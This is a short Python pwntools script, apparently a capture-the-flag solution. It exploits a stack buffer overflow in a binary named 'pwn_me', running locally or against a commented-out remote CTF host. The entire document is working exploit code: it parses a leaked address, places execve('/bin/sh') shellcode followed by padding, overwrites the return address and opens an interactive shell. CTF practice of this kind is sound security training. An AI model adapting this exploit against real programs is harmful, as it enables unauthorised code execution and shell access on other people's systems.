from pwn import *
context(arch='i386', os='linux')

bin = process('./pwn_me')

# REMOTE
# bin = remote('pwn.n0l3ptr.com', 9985)

line = bin.recv()
print line
addr = int(line.split(' = ')[1][:-3], 16)
addr = addr - 0x400
shellcode = asm(shellcraft.i386.linux.execve('/bin/sh', 0, 0))
exploit = shellcode
exploit += 'A'*1012
exploit += p32(addr)
bin.sendline(exploit)
bin.interactive()
